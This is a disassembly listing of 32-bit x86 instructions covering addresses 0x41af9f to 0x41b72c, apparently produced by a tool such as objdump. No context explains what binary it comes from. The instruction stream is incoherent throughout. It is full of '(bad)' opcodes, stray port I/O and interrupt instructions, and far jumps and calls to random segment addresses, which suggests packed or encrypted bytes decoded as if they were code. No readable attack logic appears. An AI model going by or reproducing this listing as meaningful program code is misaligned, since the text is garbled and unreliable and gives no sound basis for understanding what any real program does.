  41af9f:	popa   
  41afa0:	add    al,0x92
  41afa2:	call   0x62e8:0xa0c51059
  41afa9:	cmp    DWORD PTR [eax+0x10],0xffffffd1
  41afad:	ret    
  41afae:	adc    DWORD PTR [ecx],0x8d47f9f2
  41afb4:	push   cs
  41afb5:	and    eax,0x7a55952f
  41afba:	loop   0x41b00b
  41afbc:	xor    dl,al
  41afbe:	loope  0x41af5f
  41afc0:	addr16 pop edx
  41afc2:	ret    
  41afc3:	push   ds
  41afc4:	rol    DWORD PTR [eax+0x73],cl
  41afc7:	loope  0x41b029
  41afc9:	in     al,0xd5
  41afcb:	xchg   edx,eax
  41afcc:	retf   
  41afcd:	es ret 
  41afcf:	xor    BYTE PTR [esi+0x28],0xe5
  41afd3:	push   esi
  41afd4:	xchg   ecx,eax
  41afd5:	retf   0x7a17
  41afd8:	pop    eax
  41afd9:	and    al,BYTE PTR [ecx]
  41afdb:	(bad)  
  41afdc:	jle    0x41b000
  41afde:	sub    bl,cl
  41afe0:	jmp    0x41afaa
  41afe2:	repz aad 0x1b
  41afe5:	or     DWORD PTR [ebp-0x30],esp
  41afe8:	pop    ecx
  41afe9:	retf   0x8873
  41afec:	inc    esp
  41afed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afee:	and    esi,DWORD PTR [ebx+edx*8+0x353e969b]
  41aff5:	xor    dh,BYTE PTR [eax]
  41aff7:	sub    DWORD PTR [eax],ecx
  41aff9:	cmp    DWORD PTR [ebx],ebx
  41affb:	xchg   esp,eax
  41affc:	and    ebx,ebx
  41affe:	adc    dh,bl
  41b000:	leave  
  41b001:	repnz shl esp,0x66
  41b005:	les    eax,FWORD PTR [edi+0x54a8430d]
  41b00b:	mov    bh,0xfb
  41b00d:	push   es
  41b00e:	(bad)  
  41b00f:	xacquire xchg DWORD PTR [eax-0x623d17b9],ebx
  41b016:	stos   DWORD PTR es:[edi],eax
  41b017:	daa    
  41b018:	xor    DWORD PTR [edx],ebp
  41b01a:	loope  0x41b041
  41b01c:	mov    ds:0x2067c9c7,eax
  41b021:	addr16 int 0xd3
  41b024:	shr    BYTE PTR ds:0x3e9b7150,0x9
  41b02b:	jmp    0x9869:0x9cc43b70
  41b032:	sub    eax,0x40047d68
  41b037:	cmp    dh,BYTE PTR [eax+esi*2+0x11]
  41b03b:	outs   dx,BYTE PTR ds:[esi]
  41b03c:	shl    DWORD PTR [ebx],cl
  41b03e:	popa   
  41b03f:	icebp  
  41b040:	stc    
  41b041:	and    dl,dl
  41b043:	icebp  
  41b044:	ja     0x41b015
  41b046:	ja     0x41b008
  41b048:	mov    ds:0x5e160977,eax
  41b04d:	cmp    DWORD PTR [edx-0x5099a401],edi
  41b053:	lods   eax,DWORD PTR ds:[esi]
  41b054:	ret    0xcc4a
  41b057:	jne    0x41aff1
  41b059:	out    0x55,eax
  41b05b:	les    ebx,FWORD PTR [edx]
  41b05d:	cmp    al,BYTE PTR [ebp-0x35]
  41b060:	out    dx,al
  41b061:	mov    WORD PTR [ebp+0x7d54e646],ss
  41b067:	pop    esi
  41b068:	push   ebx
  41b069:	mov    esi,0xbadb8236
  41b06e:	jns    0x41b026
  41b070:	xchg   ecx,eax
  41b071:	retf   
  41b072:	fucom  st(7)
  41b074:	and    BYTE PTR [edi],cl
  41b076:	mov    edx,0xe7b6dbc8
  41b07b:	inc    ecx
  41b07c:	pop    edi
  41b07d:	cdq    
  41b07e:	not    BYTE PTR [ecx]
  41b080:	test   al,0xb2
  41b082:	out    dx,eax
  41b083:	fisubr DWORD PTR [edx-0x79]
  41b086:	popf   
  41b087:	nop
  41b088:	adc    eax,0xdc8d60b6
  41b08d:	(bad)  
  41b08e:	popf   
  41b08f:	push   0x2231aca7
  41b094:	jmp    0x41b097
  41b096:	or     edi,ebp
  41b098:	scas   al,BYTE PTR es:[edi]
  41b099:	sahf   
  41b09a:	inc    ebp
  41b09b:	fild   DWORD PTR [esi+eax*8+0x48]
  41b09f:	inc    ecx
  41b0a0:	lds    edi,FWORD PTR [edx-0x4e546f86]
  41b0a6:	xchg   ebp,eax
  41b0a7:	mov    eax,ds:0x75006d2e
  41b0ac:	int    0x6f
  41b0ae:	dec    esi
  41b0af:	sub    dh,bl
  41b0b1:	adc    cl,dl
  41b0b3:	or     WORD PTR [eax+0x7b],0xda7
  41b0b9:	scas   eax,DWORD PTR es:[edi]
  41b0ba:	push   edi
  41b0bb:	leave  
  41b0bc:	xchg   esp,eax
  41b0bd:	xor    DWORD PTR [edx],eax
  41b0bf:	jns    0x41b074
  41b0c1:	jmp    0x39afd700
  41b0c6:	jle    0x41b06a
  41b0c8:	mov    esp,0x98deb414
  41b0cd:	add    eax,ecx
  41b0cf:	xchg   esi,eax
  41b0d0:	and    eax,0x8054c717
  41b0d5:	mov    ecx,0xf11b0810
  41b0da:	sbb    BYTE PTR [esi-0x5d308150],dl
  41b0e0:	fsub   QWORD PTR [eax]
  41b0e2:	inc    eax
  41b0e3:	lock dec ecx
  41b0e5:	dec    esi
  41b0e6:	sub    al,0xaa
  41b0e8:	mov    ecx,0x942a4b79
  41b0ed:	cmp    bh,BYTE PTR [ebp+0x6e]
  41b0f0:	or     al,0x60
  41b0f2:	js     0x41b0f7
  41b0f4:	xor    esi,DWORD PTR [ecx]
  41b0f6:	js     0x41b128
  41b0f8:	mov    al,ds:0x508f74bd
  41b0fd:	addr16 or edi,ebp
  41b100:	out    0x5f,eax
  41b102:	inc    esp
  41b103:	jbe    0x41b0bd
  41b105:	sar    DWORD PTR [edi],cl
  41b107:	in     al,dx
  41b108:	jg     0x41b12b
  41b10a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b10b:	adc    eax,0xb9bc8cd5
  41b110:	outs   dx,DWORD PTR ds:[esi]
  41b111:	stos   DWORD PTR es:[edi],eax
  41b112:	mov    ecx,0xd17931aa
  41b117:	adc    ah,BYTE PTR [edi-0x164b4241]
  41b11d:	jg     0x41b0cd
  41b11f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b120:	jnp    0x41b0e2
  41b122:	pop    es
  41b123:	sbb    edi,DWORD PTR ds:0x5d1a5348
  41b129:	mov    ah,0xc2
  41b12b:	mov    dl,0xd6
  41b12d:	(bad)
  41b131:	fwait
  41b132:	push   ss
  41b133:	iret   
  41b134:	imul   ebp,DWORD PTR [ebx+0x483f2956],0xffffffad
  41b13b:	clc    
  41b13c:	dec    edi
  41b13e:	or     al,0xbd
  41b140:	mov    esp,0x9e2d4f2c
  41b145:	or     BYTE PTR [edi-0x14b9c99],al
  41b14b:	inc    ebp
  41b14c:	dec    ebx
  41b14d:	jns    0x41b118
  41b14f:	cli    
  41b150:	add    eax,0xa301d351
  41b155:	fnsave [eax-0x240933db]
  41b15b:	mov    ebp,0x7384c77b
  41b160:	cmp    BYTE PTR [ebx],bh
  41b162:	push   eax
  41b163:	jp     0x41b13d
  41b165:	mov    dl,BYTE PTR [ecx]
  41b167:	aas    
  41b168:	inc    edi
  41b169:	mov    bl,0x3a
  41b16b:	shl    esp,cl
  41b16d:	dec    ebp
  41b16e:	adc    ebx,DWORD PTR [ecx+0x45]
  41b171:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b172:	adc    DWORD PTR [ecx-0x400ed1f5],ecx
  41b178:	repnz out dx,al
  41b17a:	jbe    0x41b184
  41b17c:	pop    es
  41b17d:	test   DWORD PTR es:[ecx-0x5f819984],edx
  41b184:	aad    0xb
  41b186:	jmp    0xdd51:0x3476174a
  41b18d:	mov    ss,WORD PTR [ebx]
  41b18f:	ss in  eax,dx
  41b191:	add    bl,BYTE PTR [ebx-0x26fc3c17]
  41b197:	shl    BYTE PTR [edx],0x69
  41b19a:	outs   dx,BYTE PTR ds:[esi]
  41b19b:	sub    BYTE PTR [edi],bl
  41b19d:	push   esp
  41b19e:	and    eax,0xb7b9962a
  41b1a3:	xlat   BYTE PTR ds:[ebx]
  41b1a4:	ret    0xa907
  41b1a7:	call   0x5d61:0x57dab111
  41b1ae:	xor    al,0x23
  41b1b0:	add    bh,BYTE PTR [ebx]
  41b1b2:	or     ecx,ecx
  41b1b4:	mov    esp,0xa9e7851d
  41b1b9:	push   ss
  41b1ba:	mov    esi,0x3cbb4228
  41b1bf:	inc    ebp
  41b1c0:	mov    al,0x4d
  41b1c2:	aas    
  41b1c3:	and    DWORD PTR [esi*2+0x1128e6a1],0x86b21955
  41b1ce:	outs   dx,BYTE PTR ds:[esi]
  41b1cf:	test   eax,0x732ff085
  41b1d4:	cmp    BYTE PTR [eax],bh
  41b1d6:	rcr    DWORD PTR [esp+eiz*4+0x27],0xee
  41b1db:	out    dx,al
  41b1dc:	and    DWORD PTR [edx+edi*1+0x53],0x61c0fe9d
  41b1e4:	xchg   edi,eax
  41b1e5:	or     cl,cl
  41b1e7:	fwait
  41b1e8:	xor    edi,DWORD PTR [ecx-0x2]
  41b1eb:	lods   al,BYTE PTR ds:[esi]
  41b1ec:	xchg   esp,eax
  41b1ed:	(bad)  
  41b1ef:	xor    cl,BYTE PTR [edx]
  41b1f1:	stc    
  41b1f2:	push   ebp
  41b1f3:	outs   dx,BYTE PTR ds:[esi]
  41b1f4:	sub    al,dl
  41b1f6:	sbb    BYTE PTR [ebx],al
  41b1f8:	pushf  
  41b1f9:	xchg   BYTE PTR [ebp+0xc4532be],bh
  41b1ff:	nop
  41b200:	sbb    esi,0x47567d94
  41b206:	nop
  41b207:	in     al,dx
  41b208:	mov    BYTE PTR [edi+ebx*2],0x24
  41b20c:	pop    edx
  41b20d:	sbb    al,BYTE PTR [edx]
  41b20f:	jp     0x41b1db
  41b211:	inc    esp
  41b212:	aas    
  41b213:	jbe    0x41b279
  41b215:	dec    ebp
  41b216:	(bad)  
  41b217:	loope  0x41b206
  41b219:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b21a:	call   0x531e6546
  41b21f:	stos   DWORD PTR es:[edi],eax
  41b220:	add    BYTE PTR [esi-0x6bfecedc],bl
  41b226:	js     0x41b1c6
  41b228:	xchg   esp,eax
  41b229:	mov    ds:0x6ea24589,eax
  41b22e:	cs mov ecx,0x908fe534
  41b234:	loope  0x41b295
  41b236:	scas   al,BYTE PTR es:[edi]
  41b237:	ins    BYTE PTR es:[edi],dx
  41b238:	and    DWORD PTR ds:0xf7ccab3,ebx
  41b23e:	push   edx
  41b23f:	into   
  41b240:	or     esi,DWORD PTR [esi]
  41b242:	vandnpd xmm4,xmm3,XMMWORD PTR [esi-0x26a3bb59]
  41b24a:	dec    ecx
  41b24b:	fiadd  DWORD PTR [eax+0x74]
  41b24e:	dec    ebp
  41b24f:	sub    al,dl
  41b251:	pop    ds
  41b252:	fidiv  DWORD PTR [edx]
  41b254:	les    eax,FWORD PTR [esi-0x525eb0e9]
  41b25a:	push   cs
  41b25b:	jns    0x41b1f3
  41b25d:	xor    DWORD PTR fs:[edi-0x31693636],0x3b173354
  41b268:	sahf   
  41b269:	(bad)  
  41b26a:	scas   eax,DWORD PTR es:[edi]
  41b26b:	rcl    DWORD PTR [esi-0x5fb34258],1
  41b271:	xor    al,0x87
  41b273:	adc    DWORD PTR [edx-0x30],edx
  41b276:	mov    bl,0xd7
  41b278:	sahf   
  41b279:	dec    ecx
  41b27a:	sub    eax,0xed285762
  41b27f:	icebp  
  41b280:	mov    edx,0xf9ff07e1
  41b286:	mov    ds:0x82c19cc1,eax
  41b28b:	(bad)  
  41b28c:	sub    BYTE PTR [edi+edi*4],ah
  41b28f:	and    eax,0xeea11119
  41b294:	fadd   QWORD PTR [ebx-0x5c]
  41b297:	sbb    eax,0xa70a06b1
  41b29c:	scas   al,BYTE PTR es:[edi]
  41b29d:	pop    esp
  41b29e:	fisttp QWORD PTR [ebx]
  41b2a0:	sbb    al,0x8f
  41b2a2:	add    cl,dl
  41b2a4:	xchg   BYTE PTR [eax],al
  41b2a6:	sti    
  41b2a7:	or     BYTE PTR [ebx+ebx*2],0xf
  41b2ab:	in     eax,dx
  41b2ac:	jbe    0x41b292
  41b2ae:	cmp    ebx,edx
  41b2b0:	adc    eax,0xf1eefe7
  41b2b5:	mov    ds:0x12a3497f,eax
  41b2ba:	sub    al,0x85
  41b2bc:	jne    0x41b2be
  41b2be:	shr    DWORD PTR [edi],cl
  41b2c0:	lock sbb BYTE PTR [esp+ebx*4-0x70],cl
  41b2c5:	idiv   BYTE PTR [ecx+eiz*2+0x4e]
  41b2c9:	push   ds
  41b2ca:	xor    bl,ch
  41b2cc:	xchg   DWORD PTR [esi+esi*4+0x7c2144ea],ecx
  41b2d3:	daa    
  41b2d4:	pop    es
  41b2d5:	xor    eax,ebp
  41b2d7:	push   edx
  41b2d8:	into   
  41b2d9:	inc    ecx
  41b2da:	mov    esi,0x585942da
  41b2df:	scas   eax,DWORD PTR es:[edi]
  41b2e0:	test   eax,0x7dc56d27
  41b2e5:	adc    al,0x69
  41b2e7:	aaa    
  41b2e8:	dec    ebp
  41b2e9:	or     al,0xd2
  41b2eb:	sub    al,0xe7
  41b2ed:	int3   
  41b2ee:	ret    
  41b2ef:	out    0xb2,al
  41b2f1:	mov    BYTE PTR [ebx-0x2f6a5567],bl
  41b2f7:	xor    esi,eax
  41b2f9:	xchg   DWORD PTR [edx+0x60],ebx
  41b2fc:	les    esp,FWORD PTR [eax]
  41b2fe:	cmp    al,0x81
  41b300:	push   0x6d0db90a
  41b305:	fwait
  41b306:	or     al,0x2
  41b308:	out    0x48,eax
  41b30a:	and    eax,0x3df128bc
  41b30f:	push   ss
  41b310:	outs   dx,DWORD PTR cs:[esi]
  41b312:	adc    BYTE PTR [edx+0x5485c369],0xa4
  41b319:	dec    eax
  41b31a:	clc    
  41b31b:	mov    es,WORD PTR [edi+0x51bca63c]
  41b321:	pop    edi
  41b322:	mov    bh,0x6
  41b324:	cmovnp edx,eax
  41b327:	lods   al,BYTE PTR ds:[esi]
  41b328:	call   0x79235665
  41b32d:	or     BYTE PTR [ebx+0x2d45cf6a],0x3e
  41b334:	and    dh,BYTE PTR ds:0x2234af6d
  41b33a:	add    esp,DWORD PTR [ecx]
  41b33c:	out    0xd0,al
  41b33e:	push   eax
  41b33f:	out    dx,eax
  41b340:	adc    DWORD PTR ds:0x7516a767,ebx
  41b346:	jge    0x41b3ad
  41b348:	and    DWORD PTR [edx+0x3],ebp
  41b34b:	fimul  DWORD PTR [eax]
  41b34d:	add    ch,BYTE PTR cs:[edi]
  41b350:	fld    QWORD PTR [ebp+0x3e8b8063]
  41b356:	mov    cl,0xe8
  41b358:	mov    ds:0xdf31db27,al
  41b35d:	lahf   
  41b35e:	add    DWORD PTR [ebx+esi*2+0x776042be],eax
  41b365:	arpl   WORD PTR [edi+0x3e9a8814],dx
  41b36b:	iret   
  41b36c:	test   dl,al
  41b36e:	fdivr  st,st(5)
  41b370:	pop    ds
  41b371:	push   0x7c6e2db9
  41b376:	aad    0xe8
  41b378:	xchg   ebx,edx
  41b37a:	enter  0x2846,0xe2
  41b37e:	fdiv   DWORD PTR [edi+0x5de48b4d]
  41b384:	pop    ebx
  41b385:	adc    BYTE PTR [edi],dl
  41b387:	(bad)  
  41b388:	retf   
  41b389:	jns    0x41b32b
  41b38b:	pushf  
  41b38c:	sahf   
  41b38d:	mov    ecx,0xf8fbb0cd
  41b392:	xor    al,0xc8
  41b394:	dec    ecx
  41b395:	jge    0x41b3a5
  41b397:	rol    DWORD PTR [esi+0x66a4a3a],0x85
  41b39e:	mov    esi,esi
  41b3a0:	jae    0x41b3c0
  41b3a2:	adc    DWORD PTR [edx-0x81dd93a],ebx
  41b3a8:	setnp  BYTE PTR [ecx+ecx*2]
  41b3ac:	std    
  41b3ad:	fsub   QWORD PTR [ebp-0x546acddb]
  41b3b3:	cmp    al,0x3
  41b3b5:	loop   0x41b406
  41b3b7:	mov    ss,esp
  41b3b9:	test   BYTE PTR [ebx+edx*1+0x4f],dh
  41b3bd:	add    DWORD PTR [eax+edi*1+0x442d0ff4],ebx
  41b3c4:	outs   dx,DWORD PTR ds:[esi]
  41b3c5:	aad    0x4d
  41b3c7:	shl    DWORD PTR [esp+ebx*4],cl
  41b3ca:	and    al,BYTE PTR [ebp+0x4b]
  41b3cd:	cmp    BYTE PTR [ebx-0x47],dl
  41b3d0:	ja     0x41b37c
  41b3d2:	and    DWORD PTR [edi+0x7],0xb805f0d2
  41b3d9:	ins    BYTE PTR es:[edi],dx
  41b3da:	add    al,0xaa
  41b3dc:	xor    eax,0x79f61eba
  41b3e1:	jno    0x41b36f
  41b3e3:	enter  0xb831,0xad
  41b3e7:	fs mov bl,dl
  41b3ea:	fwait
  41b3eb:	dec    edx
  41b3ec:	mov    ds:0xf34ece30,al
  41b3f1:	cdq    
  41b3f2:	mov    ecx,eax
  41b3f4:	stos   DWORD PTR es:[edi],eax
  41b3f5:	sub    esi,esp
  41b3f7:	jo     0x41b444
  41b3f9:	add    al,0x46
  41b3fb:	mov    edi,0x260e34b9
  41b400:	(bad)  
  41b401:	addr16 mov esp,0x94e28e35
  41b407:	scas   al,BYTE PTR es:[edi]
  41b408:	pop    eax
  41b409:	repz fistp DWORD PTR gs:[esi]
  41b40d:	nop
  41b40e:	sub    ah,al
  41b410:	add    DWORD PTR [edi-0x39],0x978a96a1
  41b417:	data16 icebp 
  41b419:	xchg   edi,eax
  41b41a:	mov    BYTE PTR [ebp-0x38c5fed2],ch
  41b420:	xor    esi,ecx
  41b422:	(bad)  
  41b423:	sti    
  41b424:	cld    
  41b425:	xor    BYTE PTR [edx],ch
  41b427:	jecxz  0x41b4a1
  41b429:	clc    
  41b42a:	popa   
  41b42b:	jno    0x41b441
  41b42d:	ret    0x7638
  41b430:	pop    esp
  41b431:	add    al,bl
  41b433:	xlat   BYTE PTR ds:[ebx]
  41b434:	in     eax,0x96
  41b436:	dec    eax
  41b437:	adc    DWORD PTR [edx-0x29],0xfffffff1
  41b43b:	das    
  41b43c:	cmovns edi,DWORD PTR [ebx-0x60ed58bb]
  41b443:	mov    bh,0x47
  41b445:	iret   
  41b446:	loope  0x41b414
  41b448:	not    DWORD PTR [esi+0x30]
  41b44b:	push   esi
  41b44c:	and    bl,cl
  41b44e:	adc    edx,DWORD PTR [ecx+ebx*1-0x4064f6e7]
  41b455:	pop    ebx
  41b456:	sub    al,0xe2
  41b458:	sub    DWORD PTR [edx-0x2b],ecx
  41b45b:	pushf  
  41b45c:	xchg   edi,eax
  41b45d:	jp     0x41b48c
  41b45f:	mov    edi,0xc617ac55
  41b464:	hlt    
  41b465:	ds cdq 
  41b467:	pusha  
  41b468:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b469:	xchg   esp,eax
  41b46a:	repz dec edx
  41b46c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b46d:	into   
  41b46e:	(bad)  
  41b46f:	mov    al,cs:0x73f7d930
  41b475:	aam    0xe4
  41b477:	icebp  
  41b478:	mov    bh,0x98
  41b47a:	div    BYTE PTR [edi]
  41b47c:	mov    bl,cl
  41b47e:	xchg   edi,eax
  41b47f:	mov    esp,0xb42d161
  41b484:	dec    ecx
  41b485:	inc    esi
  41b486:	mov    dl,0x7d
  41b488:	pop    ss
  41b489:	fsub   st,st(4)
  41b48b:	ds loop 0x41b4b2
  41b48e:	xchg   edi,eax
  41b48f:	pop    edx
  41b490:	inc    ebx
  41b491:	or     eax,DWORD PTR [edx+0x184f6447]
  41b497:	and    eax,0xfbcba710
  41b49c:	loopne 0x41b4d3
  41b49e:	scas   eax,DWORD PTR es:[edi]
  41b49f:	in     eax,0x3b
  41b4a1:	inc    edx
  41b4a2:	and    BYTE PTR [ebx-0x5ef73b4f],bl
  41b4a8:	(bad)  [edi+eax*2]
  41b4ab:	popf   
  41b4ac:	sti    
  41b4ad:	cmp    al,0x4
  41b4af:	jl     0x41b4e9
  41b4b1:	push   edx
  41b4b2:	mov    WORD PTR [edi],cs
  41b4b4:	add    ebx,DWORD PTR [edx]
  41b4b6:	enter  0xa307,0x4a
  41b4ba:	out    0xf4,al
  41b4bc:	lea    esi,[eax-0x69]
  41b4bf:	or     DWORD PTR [ebp-0xe],ecx
  41b4c2:	mov    edi,0x8b6c11fd
  41b4c7:	mov    cl,ah
  41b4c9:	push   eax
  41b4ca:	push   es
  41b4cb:	mov    ecx,0x78bb3873
  41b4d0:	cs (bad) 
  41b4d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4d4:	rol    DWORD PTR [eax-0x280319a4],0x1e
  41b4db:	(bad)  
  41b4dc:	jae    0x41b4e1
  41b4de:	ins    BYTE PTR es:[edi],dx
  41b4df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4e0:	push   eax
  41b4e1:	sub    dl,0x8
  41b4e4:	adc    DWORD PTR [edx+0x473398f2],0x47d9ba79
  41b4ee:	and    ah,BYTE PTR [esi-0x10]
  41b4f1:	push   0xef005b78
  41b4f6:	xor    DWORD PTR [eax-0x16],0xb7972df8
  41b4fd:	aas    
  41b4fe:	and    al,BYTE PTR [ecx+0x44]
  41b501:	out    dx,al
  41b502:	sahf   
  41b503:	add    eax,0x652016a6
  41b508:	mov    edi,0xe1165c64
  41b50d:	je     0x41b4be
  41b50f:	xchg   esp,ebp
  41b511:	mov    ah,0xa
  41b513:	daa    
  41b514:	inc    ecx
  41b515:	add    BYTE PTR [ecx-0x5ec99487],dh
  41b51b:	push   0xdda0ac27
  41b520:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b521:	pop    ds
  41b522:	sar    BYTE PTR [ebx-0xe],1
  41b525:	lods   al,BYTE PTR ds:[esi]
  41b526:	call   0xb8ba:0x308552c4
  41b52d:	int3   
  41b52e:	inc    ecx
  41b52f:	das    
  41b530:	dec    ebx
  41b531:	cwde   
  41b532:	pop    ss
  41b533:	push   edx
  41b534:	jae    0x41b53f
  41b536:	xchg   ecx,ebx
  41b538:	test   BYTE PTR [ebx+0x5adfd723],bl
  41b53e:	inc    esp
  41b53f:	jge    0x41b56c
  41b541:	and    DWORD PTR [edi],esi
  41b543:	inc    esi
  41b544:	mov    ebp,?
  41b546:	sbb    DWORD PTR [edi],0x7c
  41b549:	push   ecx
  41b54a:	and    eax,0x7cf61483
  41b54f:	xor    ebx,DWORD PTR es:[edx]
  41b552:	das    
  41b553:	les    ecx,FWORD PTR [ebp+0x26]
  41b556:	stos   DWORD PTR es:[edi],eax
  41b557:	adc    DWORD PTR [edx-0x7cad5af5],0x695b143f
  41b561:	aad    0xa7
  41b563:	pop    ecx
  41b564:	inc    edx
  41b565:	xor    al,0x39
  41b567:	adc    ebp,DWORD PTR [ebp+0x2f9df99b]
  41b56d:	out    dx,eax
  41b56e:	pop    ebp
  41b56f:	mov    ebx,0x3a11b93b
  41b574:	mov    al,0x66
  41b576:	xor    eax,0xf65cc2eb
  41b57b:	sbb    esi,DWORD PTR [ebx-0x467b1eef]
  41b581:	and    BYTE PTR [edx-0x7c],cl
  41b584:	into   
  41b585:	pop    eax
  41b586:	sub    al,0x87
  41b588:	jmp    0x452fbc09
  41b58d:	pop    ebp
  41b58e:	mov    dl,0x74
  41b590:	cmp    al,0x58
  41b592:	xchg   ebx,eax
  41b593:	into   
  41b594:	mov    BYTE PTR [edx+0x516b1fdf],0xac
  41b59b:	rcl    BYTE PTR [eax+0x14],1
  41b59e:	xor    dl,BYTE PTR [ebp-0x45]
  41b5a1:	(bad)  
  41b5a2:	stc    
  41b5a3:	je     0x41b5b9
  41b5a5:	and    DWORD PTR [esi-0x5d],ecx
  41b5a8:	add    BYTE PTR [ebx],0xec
  41b5ab:	mov    fs,WORD PTR [esi+0x20]
  41b5ae:	pop    ecx
  41b5af:	xor    dl,BYTE PTR [ebp+0x45]
  41b5b2:	dec    edi
  41b5b3:	jo     0x41b60b
  41b5b5:	std    
  41b5b6:	fiadd  DWORD PTR [edi-0x1d403827]
  41b5bc:	xor    bl,cl
  41b5be:	push   ebx
  41b5bf:	shl    DWORD PTR [ecx-0x76],cl
  41b5c2:	adc    ecx,DWORD PTR [bx-0x35b6]
  41b5c7:	ss pop ebp
  41b5c9:	add    BYTE PTR [edx],cl
  41b5cb:	push   esi
  41b5cc:	test   BYTE PTR [eax+0x5442e41b],dl
  41b5d2:	leave  
  41b5d3:	and    eax,DWORD PTR [ebx+edx*1+0x13]
  41b5d7:	stos   BYTE PTR es:[edi],al
  41b5d8:	sub    DWORD PTR [ebx],0xffffff9d
  41b5db:	inc    ecx
  41b5dc:	adc    al,0xb
  41b5de:	xchg   esi,eax
  41b5df:	or     ch,BYTE PTR [ecx]
  41b5e1:	add    esi,esi
  41b5e3:	mov    al,ds:0x8e069603
  41b5e8:	out    0xaf,al
  41b5ea:	aaa    
  41b5eb:	cmp    eax,0xd1e05a05
  41b5f0:	xchg   esp,eax
  41b5f1:	add    ebp,esp
  41b5f3:	or     eax,0xcafb50c8
  41b5f8:	les    edi,FWORD PTR [ebp-0x59]
  41b5fb:	mov    DWORD PTR [ecx],ebp
  41b5fd:	pop    es
  41b5fe:	nop
  41b5ff:	adc    ecx,DWORD PTR [edi-0x3709dd7f]
  41b605:	(bad)  
  41b606:	and    DWORD PTR ds:[edi-0xe],ecx
  41b60a:	xor    ebx,DWORD PTR [edx]
  41b60c:	dec    edx
  41b60d:	shr    BYTE PTR ds:0x6a115952,0x63
  41b614:	pop    ebp
  41b615:	jnp    0x41b5d7
  41b617:	gs sub ah,ah
  41b61a:	inc    eax
  41b61b:	dec    ecx
  41b61c:	pop    esp
  41b61d:	scas   eax,DWORD PTR es:[edi]
  41b61e:	push   ds
  41b61f:	pop    ds
  41b620:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b621:	xor    BYTE PTR [eax-0x7ea6de80],bl
  41b627:	push   ecx
  41b628:	adc    esp,ebx
  41b62a:	xor    BYTE PTR [ecx+0x73],0xe5
  41b62e:	iret   
  41b62f:	pop    eax
  41b630:	shl    DWORD PTR [ebx],cl
  41b632:	sbb    bl,BYTE PTR [esi-0x66]
  41b635:	cmp    cl,dl
  41b637:	out    0x9e,al
  41b639:	mov    ebx,0x7e78d8e7
  41b63e:	lods   eax,DWORD PTR ds:[esi]
  41b63f:	xchg   edx,eax
  41b640:	addr16 sbb al,0xba
  41b643:	and    esi,esp
  41b645:	sbb    BYTE PTR [esi],cl
  41b647:	ds mov al,0xfb
  41b64a:	add    al,0x7e
  41b64c:	test   DWORD PTR [ebx],ecx
  41b64e:	cli    
  41b64f:	rcr    DWORD PTR [ebx+0x6a],1
  41b652:	repz mov dh,BYTE PTR [edi+edi*2-0x6cdd679f]
  41b65a:	push   ecx
  41b65b:	test   ah,cl
  41b65d:	int3   
  41b65e:	test   DWORD PTR [esi+0x1f],ebx
  41b661:	loopne 0x41b635
  41b663:	enter  0xbb0d,0x12
  41b667:	pop    edx
  41b668:	or     al,0x33
  41b66a:	jecxz  0x41b6b0
  41b66c:	inc    edi
  41b66d:	xchg   ebp,eax
  41b66e:	adc    BYTE PTR [ebx-0x4398971e],dh
  41b674:	xchg   edi,eax
  41b675:	sub    cl,al
  41b677:	(bad)  
  41b679:	mov    ecx,0xd76b2ddb
  41b67e:	sbb    eax,0xdd19ccc0
  41b683:	fdivr  QWORD PTR [edi]
  41b685:	aas    
  41b686:	lock mov ebp,0x8cdce468
  41b68c:	or     bh,BYTE PTR [esi-0x2f]
  41b68f:	popa   
  41b690:	mov    DWORD PTR [edx+eax*4],esi
  41b693:	test   bh,ch
  41b695:	jg     0x41b63d
  41b697:	adc    eax,0x60a2373f
  41b69c:	mov    bl,0xec
  41b69e:	(bad)  
  41b69f:	xor    eax,DWORD PTR [ecx]
  41b6a1:	or     esp,edi
  41b6a3:	jmp    0x9b5c:0x3470436
  41b6aa:	mov    edi,0x66521b49
  41b6af:	int3   
  41b6b0:	dec    esi
  41b6b1:	into   
  41b6b2:	xor    al,0xa4
  41b6b4:	push   eax
  41b6b5:	pusha  
  41b6b6:	repnz sbb ebp,ecx
  41b6b9:	pop    ebx
  41b6ba:	xor    eax,0xf3ca6d25
  41b6bf:	mov    ah,0x7f
  41b6c1:	mov    ch,0xd8
  41b6c3:	dec    edx
  41b6c4:	dec    edi
  41b6c5:	pop    es
  41b6c6:	outs   dx,BYTE PTR ds:[esi]
  41b6c7:	mov    dl,0xe9
  41b6c9:	cmp    eax,0xd3c9da9
  41b6ce:	cmp    bh,dl
  41b6d0:	in     al,0x67
  41b6d2:	gs repz cdq 
  41b6d5:	xor    eax,0x4a5f7b6a
  41b6da:	call   0x26b3d41d
  41b6df:	mov    ebx,0xc4256de4
  41b6e4:	mov    ch,bh
  41b6e6:	push   ecx
  41b6e7:	mov    bh,0xb4
  41b6e9:	dec    ebx
  41b6ea:	pushf  
  41b6eb:	jl     0x41b6a1
  41b6ed:	xchg   edi,eax
  41b6ee:	mov    ebp,0x535b9e15
  41b6f3:	sbb    eax,0x53484c21
  41b6f8:	and    BYTE PTR [esi+0x19],dh
  41b6fb:	ret    
  41b6fc:	mov    al,0x13
  41b6fe:	adc    BYTE PTR [esi],dl
  41b700:	inc    esp
  41b701:	call   0xa4b:0x869db8a0
  41b708:	popa   
  41b709:	xchg   esp,eax
  41b70a:	cmc    
  41b70b:	adc    eax,0x734212ed
  41b710:	mov    al,dh
  41b712:	push   ebp
  41b713:	gs pop eax
  41b715:	mov    es,WORD PTR [ecx+0x34]
  41b718:	popa   
  41b719:	scas   eax,DWORD PTR es:[edi]
  41b71a:	retf   
  41b71b:	push   ebx
  41b71c:	and    DWORD PTR [esi-0x10b87faa],ecx
  41b722:	xor    ecx,DWORD PTR ds:0xfe0fc348
  41b728:	loope  0x41b781
  41b72a:	jg     0x41b6ce
  41b72c:	outs   dx,DWORD PTR ds:[esi]
